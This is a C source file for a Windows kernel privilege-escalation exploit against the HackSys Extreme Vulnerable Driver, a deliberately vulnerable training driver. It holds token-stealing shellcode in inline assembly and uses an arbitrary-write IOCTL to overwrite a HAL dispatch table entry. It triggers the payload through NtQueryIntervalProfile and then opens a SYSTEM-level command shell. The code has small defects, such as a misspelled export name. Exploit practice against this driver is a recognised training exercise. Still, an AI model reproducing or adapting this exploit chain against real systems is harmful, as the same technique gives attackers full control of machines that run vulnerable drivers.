#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>


#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,\
	METHOD_NEITHER, FILE_ANY_ACCESS)

#define KTHREAD_OFFSET  0x124
#define EPROCESS_OFFSET 0x044
#define PID_OFFSET		0x084
#define FLINK_OFFSET	0x088
#define TOKEN_OFFSET	0x0c8
#define SYSTEM_PID      0x004

VOID TokenStealingShellcodeWin() {
	__asm {
		pushad

		mov eax, fs:[KTHREAD_OFFSET]
		mov eax, [eax + EPROCESS_OFFSET]

		mov ecx, eax
		mov ebx, [eax + TOKEN_OFFSET]
		mov edx, SYSTEM_PID

		SearchSystemPID :
		mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]
			mov[ecx + TOKEN_OFFSET], edx

			popad
	}
}

typedef struct _WRITE_WHAT_WHERE {
	PULONG What;
	PULONG Where;
}WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef enum {
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInfomation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation
}SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct {
	PVOID Reserved1;
	PVOID Reserved2;
	PVOID Base;
	ULONG ImageSize;
	ULONG Flags;
	WORD  Id;
	WORD  Rank;
	WORD  w108;
	WORD  NameOffset;
	CHAR  imageName[256];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct {
	ULONG ModulesCount;
	SYSTEM_MODULE Modules[0];
}SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS, \
	OUT PVOID SystemInformation, \
	IN ULONG  SystemInformationLength,
	OUT PULONG ReturnLength);


typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource, \
	OUT PULONG Interval);

int _tmain(int argc, _TCHAR* argv[]) {
	PWRITE_WHAT_WHERE WriteWhatWhere = NULL;
	PVOID HalDispatchTabel = NULL;
	PVOID HalDispatchTabel4 = NULL;
	HMODULE ntoskrnl = NULL;
	PVOID kernelBase = NULL;
	HMODULE ntdll = NULL;
	//function
	NtQuerySystemInformation_t NtQuerySystemInformation;
	//////////////////////////////////////////////////////////////////
	NTSTATUS Ntstatus = 0xc0000001;
	SIZE_T ReturnLength;
	PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;
	PCHAR KernelImage;
	PVOID KernelBaseAddressInKernelMode;
	HMODULE hKernelInUserMode = NULL;
	PVOID EopPayload = &TokenStealingShellcodeWin;
	//////////////////////////////////////////////////////////////////
	NtQueryIntervalProfile_t NtQueryIntervalProfile;
	ULONG Interval = 0;
	//////////////////////////////////////////////////////////////////
	DWORD lpBytesReturned;
	PVOID pMemoryAddress = NULL;
	PULONG IpInBuffer = NULL;
	LPCSTR lpDeviceName = (LPCSTR) "\\\\.\\HackSysExtremeVulnerableDriver";

	printf("Getting the device handle\r\n");
	HANDLE hDriver = CreateFileA(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle : (0x%X\r\n)", GetLastError());
		return 1;
	}
	printf("Got the device Handle : 0x%X\r\n", hDriver);

	WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), \
		HEAP_ZERO_MEMORY, \
		sizeof(WRITE_WHAT_WHERE));

	//Step 3.
	ntdll = GetModuleHandle(L"ntdll.dll");
	NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, \
		"NtQuerySystemInformation");

	Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \
		NULL, \
		0, \
		&ReturnLength);
	pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), \
		HEAP_ZERO_MEMORY, \
		ReturnLength);
	Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \
		pSystemModuleInformation, \
		ReturnLength, \
		&ReturnLength);

	KernelBaseAddressInKernelMode = pSystemModuleInformation->Modules[0].Base;
	KernelImage = strrchr((PCHAR)pSystemModuleInformation->Modules[0].imageName, '\\') + 1;

	//Step 1 and 2:
	printf("KernelImage : %s\n", KernelImage);
	hKernelInUserMode = LoadLibraryA(KernelImage);
	HalDispatchTabel = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTabel");

	//Step 4:
	HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel - (ULONG)hKernelInUserMode);
	HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel + (ULONG)KernelBaseAddressInKernelMode);

	HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);
	FreeLibrary(ntdll);
	FreeLibrary(hKernelInUserMode);

	//end
	HalDispatchTabel4 = (PVOID)((ULONG)HalDispatchTabel + sizeof(PVOID));
	WriteWhatWhere->What = (PULONG)&EopPayload;
	WriteWhatWhere->Where = (PULONG)HalDispatchTabel4;

	printf("\t[*]Where : 0x%p\n", WriteWhatWhere->Where);
	printf("\t[*]What  : 0x%p\n", WriteWhatWhere->What);
	printf("\t[*]Exp   : 0x%p\n", EopPayload);

	printf("Send IOCTL request\r\n");

	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		(LPVOID)WriteWhatWhere,
		sizeof(WriteWhatWhere),
		NULL,
		0,
		&lpBytesReturned,
		NULL);

	//triger the memory overwrite
	ntdll = LoadLibraryA("ntdll.dll");
	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	NtQueryIntervalProfile(0x1337, &Interval);
	HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);
	system("cmd.exe");
	printf("IOCTL request completed,cleaning up da heap.\r\n");
	CloseHandle(hDriver);
	return 0;
}